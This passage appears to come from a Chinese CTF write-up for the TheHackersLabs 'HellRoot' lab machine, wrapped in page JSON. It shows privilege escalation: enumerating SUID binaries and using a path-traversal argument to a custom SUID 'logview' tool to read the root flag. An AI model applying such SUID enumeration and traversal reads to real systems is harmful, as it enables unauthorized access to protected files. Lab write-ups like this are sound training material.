alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能读取到 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsHellRoot/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e权限提升\u003c/h2\u003e\n\u003cp\u003e寻找存在 \u003ccode\u003esuid\u003c/code\u003e 权限的程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003eastro@hellroot:~$ find / -perm -u=s -type f 2\u003e/dev/null\n/usr/local/bin/secmonitor\n/usr/local/bin/logview\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有两个奇怪的程序 \u003ccode\u003elogview\u003c/code\u003e 和 \u003ccode\u003esecmonitor\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elogview\u003c/code\u003e 能直接读文件，直接读 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-scheme\"\u003eastro@hellroot:~$ logview ../../root/root.txt\n[logview] Running with administrative privileges\nDisplaying log: /var/log/../../root/root.txt\nf03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e","title":"TheHackersLabs - HellRoot","date":"2025-08-02","updated":"2025-08-02","tags":["TheHackersLabs","Linux","RCE","Logview"],"categories":"靶机","comments":true,"description":"HellRoot https://labs.thehackerslabs.com/machine/121 Recon PortScan 扫描出来有两个 SSH 服务，三个 Web 枚举 192.168.56.5 是 Apache 的默认页面 https://git.hellroot.thl/ 是 G..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsHellRoot"},"buildId":"rBOAoH_mNY0kmuqb3_RcF","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>